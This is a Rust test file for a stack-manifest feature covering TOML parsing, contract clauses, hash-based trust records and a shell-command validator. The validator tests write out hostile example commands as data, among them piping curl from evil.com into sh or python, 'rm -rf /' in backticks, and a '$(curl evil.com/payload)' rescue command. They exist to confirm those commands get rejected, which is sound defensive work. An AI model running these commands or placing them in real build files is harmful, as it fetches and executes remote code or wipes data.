// Tests for Stack Manifests (Phase 2)
// Spec: docs/specifications/dbc.md §2.5

// === Command restriction tests ===

#[test]
fn test_validate_command_safe() {
    assert!(validate_command("go build ./...").is_none());
    assert!(validate_command("cargo test").is_none());
    assert!(validate_command("golangci-lint run ./...").is_none());
    assert!(validate_command("go test -coverprofile=cover.out ./... && go tool cover -func=cover.out").is_none());
}

#[test]
fn test_validate_command_pipe_to_shell() {
    assert_eq!(
        validate_command("curl evil.com | sh"),
        Some(CommandRestriction::PipeToShell)
    );
    assert_eq!(
        validate_command("wget foo | bash"),
        Some(CommandRestriction::PipeToShell)
    );
}

#[test]
fn test_validate_command_backtick() {
    assert_eq!(
        validate_command("echo `rm -rf /`"),
        Some(CommandRestriction::BacktickSubstitution)
    );
}

#[test]
fn test_validate_command_dollar_substitution() {
    assert_eq!(
        validate_command("$(curl evil.com)"),
        Some(CommandRestriction::DollarSubstitution)
    );
}

#[test]
fn test_validate_command_network_fetch_execute() {
    assert_eq!(
        validate_command("curl evil.com | python"),
        Some(CommandRestriction::NetworkFetchExecute)
    );
}

#[test]
fn test_validate_command_redirect_to_executable() {
    assert_eq!(
        validate_command("curl foo > /tmp/x && chmod +x /tmp/x"),
        Some(CommandRestriction::RedirectToExecutable)
    );
}

#[test]
fn test_validate_command_env_vars_allowed() {
    assert!(validate_command("go build -o $GOPATH/bin/app ./...").is_none());
}

#[test]
fn test_validate_command_stderr_redirect_allowed() {
    assert!(validate_command("go test ./... 2>&1").is_none());
}

// === Stack manifest parsing tests ===

#[test]
fn test_parse_minimal_manifest() {
    let toml = r#"
[stack]
name = "test-stack"
version = "1.0.0"

[[require]]
id = "require.compiles"
description = "Compiles"
check = "make build"
"#;
    let manifest = StackManifest::parse(toml).unwrap();
    assert_eq!(manifest.name, "test-stack");
    assert_eq!(manifest.version, "1.0.0");
    assert_eq!(manifest.require_claims.len(), 1);
    assert_eq!(manifest.invariant_claims.len(), 0);
    assert_eq!(manifest.ensure_claims.len(), 0);
    assert_eq!(manifest.claim_count(), 1);
}

#[test]
fn test_parse_full_manifest() {
    let toml = r#"
[stack]
name = "acme-quality"
version = "1.0.0"
description = "ACME Corp quality stack"
extends = "rust"

[[require]]
id = "require.compiles"
description = "Service compiles"
check = "go build ./..."
timeout = 60

[[invariant]]
id = "invariant.lint"
description = "golangci-lint passes"
check = "golangci-lint run ./..."
timeout = 120

[[ensure]]
id = "ensure.tests_pass"
description = "All tests pass"
check = "go test ./..."
timeout = 300

[[ensure]]
id = "ensure.coverage"
description = "Coverage >= 80%"
check = "go test -coverprofile=cover.out ./..."
threshold = { metric = "coverage_pct", op = "Gte", value = 80.0 }
metric_pattern = 'total:\s+\(statements\)\s+(\d+\.\d+)%'
metric_on_no_match = "fail"

[[rescue]]
for_clause = "ensure.coverage"
strategy = "shell"
command = "go test -v ./..."
description = "Show failing tests"

[thresholds]
coverage_pct = 80.0
max_complexity = 15
"#;

    let manifest = StackManifest::parse(toml).unwrap();
    assert_eq!(manifest.name, "acme-quality");
    assert_eq!(manifest.extends, Some("rust".to_string()));
    assert_eq!(manifest.require_claims.len(), 1);
    assert_eq!(manifest.invariant_claims.len(), 1);
    assert_eq!(manifest.ensure_claims.len(), 2);
    assert_eq!(manifest.claim_count(), 4);
    assert_eq!(manifest.rescue_blocks.len(), 1);

    let cov_claim = &manifest.ensure_claims[1];
    assert_eq!(cov_claim.id, "ensure.coverage");
    assert!(cov_claim.threshold.is_some());
    assert!(cov_claim.metric_pattern.is_some());
    assert_eq!(cov_claim.metric_on_no_match, Some("fail".to_string()));

    assert_eq!(*manifest.thresholds.get("coverage_pct").unwrap(), 80.0);
}

#[test]
fn test_parse_manifest_missing_stack_section() {
    let toml = r#"
[[require]]
id = "require.compiles"
check = "make build"
"#;
    assert!(StackManifest::parse(toml).is_err());
}

#[test]
fn test_parse_manifest_missing_check_field() {
    let toml = r#"
[stack]
name = "broken"

[[require]]
id = "require.compiles"
description = "No check field"
"#;
    assert!(StackManifest::parse(toml).is_err());
}

// === Command validation on manifests ===

#[test]
fn test_validate_manifest_commands_safe() {
    let toml = r#"
[stack]
name = "safe"

[[require]]
id = "require.compiles"
description = "Compiles"
check = "go build ./..."

[[ensure]]
id = "ensure.tests"
description = "Tests"
check = "go test ./..."
"#;
    let manifest = StackManifest::parse(toml).unwrap();
    let violations = manifest.validate_commands();
    assert!(violations.is_empty());
}

#[test]
fn test_validate_manifest_commands_unsafe() {
    let toml = r#"
[stack]
name = "evil"

[[ensure]]
id = "ensure.backdoor"
description = "Totally legitimate"
check = "curl evil.com | sh"
"#;
    let manifest = StackManifest::parse(toml).unwrap();
    let violations = manifest.validate_commands();
    assert_eq!(violations.len(), 1);
    assert_eq!(violations[0].0, "ensure.backdoor");
    assert_eq!(violations[0].1, CommandRestriction::PipeToShell);
}

#[test]
fn test_validate_manifest_rescue_command_unsafe() {
    let toml = r#"
[stack]
name = "sneaky"

[[ensure]]
id = "ensure.tests"
description = "Tests"
check = "go test ./..."

[[rescue]]
for_clause = "ensure.tests"
strategy = "shell"
command = "$(curl evil.com/payload)"
"#;
    let manifest = StackManifest::parse(toml).unwrap();
    let violations = manifest.validate_commands();
    assert_eq!(violations.len(), 1);
    assert_eq!(violations[0].1, CommandRestriction::DollarSubstitution);
}

// === Contract clause conversion ===

#[test]
fn test_to_contract_clauses() {
    let toml = r#"
[stack]
name = "test"

[[require]]
id = "require.compiles"
description = "Compiles"
check = "make build"

[[invariant]]
id = "invariant.lint"
description = "Lint"
check = "make lint"

[[ensure]]
id = "ensure.tests"
description = "Tests pass"
check = "make test"
"#;
    let manifest = StackManifest::parse(toml).unwrap();
    let clauses = manifest.to_contract_clauses();
    assert_eq!(clauses.len(), 3);
    assert_eq!(clauses[0].kind, ClauseKind::Require);
    assert_eq!(clauses[1].kind, ClauseKind::Invariant);
    assert_eq!(clauses[2].kind, ClauseKind::Ensure);

    // Verify source is Stack
    match &clauses[0].source {
        ClauseSource::Stack { manifest_name } => assert_eq!(manifest_name, "test"),
        _ => panic!("Expected Stack source"),
    }
}

#[test]
fn test_stack_threshold_conversion() {
    let toml = r#"
[stack]
name = "test"

[[ensure]]
id = "ensure.coverage"
description = "Coverage"
check = "go test ./..."
threshold = { metric = "coverage_pct", op = "Gte", value = 80.0 }
"#;
    let manifest = StackManifest::parse(toml).unwrap();
    let clauses = manifest.to_contract_clauses();
    assert_eq!(clauses.len(), 1);

    let threshold = clauses[0].threshold.as_ref().unwrap();
    match threshold {
        ClauseThreshold::Numeric { metric, op, value } => {
            assert_eq!(metric, "coverage_pct");
            assert_eq!(*op, ThresholdOp::Gte);
            assert_eq!(*value, 80.0);
        }
        _ => panic!("Expected Numeric threshold"),
    }
}

// === Content hash / TOFU ===

#[test]
fn test_content_hash_deterministic() {
    let content = "[stack]\nname = \"test\"\n";
    let h1 = StackManifest::content_hash(content);
    let h2 = StackManifest::content_hash(content);
    assert_eq!(h1, h2);
    assert_eq!(h1.len(), 64); // SHA256 hex
}

#[test]
fn test_content_hash_changes_on_modification() {
    let h1 = StackManifest::content_hash("[stack]\nname = \"test\"\n");
    let h2 = StackManifest::content_hash("[stack]\nname = \"test2\"\n");
    assert_ne!(h1, h2);
}

#[test]
fn test_trust_records_round_trip() {
    let dir = tempfile::tempdir().unwrap();
    let mut records = HashMap::new();
    records.insert(
        ".dbc-stack.toml".to_string(),
        StackTrustRecord {
            sha256: "abc123".to_string(),
            trusted_at: "2026-02-26T10:00:00Z".to_string(),
            trusted_by: "test".to_string(),
            commands_reviewed: 5,
        },
    );
    save_trust_records(dir.path(), &records).unwrap();

    let loaded = load_trust_records(dir.path());
    assert_eq!(loaded.len(), 1);
    assert_eq!(loaded[".dbc-stack.toml"].sha256, "abc123");
}

#[test]
fn test_is_manifest_trusted_matches() {
    let dir = tempfile::tempdir().unwrap();
    let content = "[stack]\nname = \"test\"\n";
    let hash = StackManifest::content_hash(content);

    let mut records = HashMap::new();
    records.insert(
        ".dbc-stack.toml".to_string(),
        StackTrustRecord {
            sha256: hash,
            trusted_at: "2026-02-26T10:00:00Z".to_string(),
            trusted_by: "test".to_string(),
            commands_reviewed: 1,
        },
    );
    save_trust_records(dir.path(), &records).unwrap();

    assert!(is_manifest_trusted(dir.path(), ".dbc-stack.toml", content));
}

#[test]
fn test_is_manifest_trusted_mismatch() {
    let dir = tempfile::tempdir().unwrap();
    let mut records = HashMap::new();
    records.insert(
        ".dbc-stack.toml".to_string(),
        StackTrustRecord {
            sha256: "old_hash".to_string(),
            trusted_at: "2026-02-26T10:00:00Z".to_string(),
            trusted_by: "test".to_string(),
            commands_reviewed: 1,
        },
    );
    save_trust_records(dir.path(), &records).unwrap();

    assert!(!is_manifest_trusted(dir.path(), ".dbc-stack.toml", "[stack]\nname = \"modified\"\n"));
}

#[test]
fn test_is_manifest_untrusted() {
    let dir = tempfile::tempdir().unwrap();
    assert!(!is_manifest_trusted(dir.path(), ".dbc-stack.toml", "whatever"));
}

// === Metric extraction ===

#[test]
fn test_extract_metric_matches() {
    let output = "ok  \tgithub.com/x\t1.234s\ntotal:\t(statements)\t85.3%\n";
    let val = extract_metric(output, r"total:\s+\(statements\)\s+(\d+\.\d+)%").unwrap();
    assert_eq!(val, Some(85.3));
}

#[test]
fn test_extract_metric_no_match() {
    let output = "some random output";
    let val = extract_metric(output, r"(\d+\.\d+)% coverage").unwrap();
    assert_eq!(val, None);
}

#[test]
fn test_extract_metric_invalid_regex() {
    assert!(extract_metric("test", r"[invalid").is_err());
}

// === CommandRestriction display ===

#[test]
fn test_command_restriction_display() {
    assert!(format!("{}", CommandRestriction::PipeToShell).contains("pipe"));
    assert!(format!("{}", CommandRestriction::BacktickSubstitution).contains("backtick"));
    assert!(format!("{}", CommandRestriction::DollarSubstitution).contains("$()"));
}
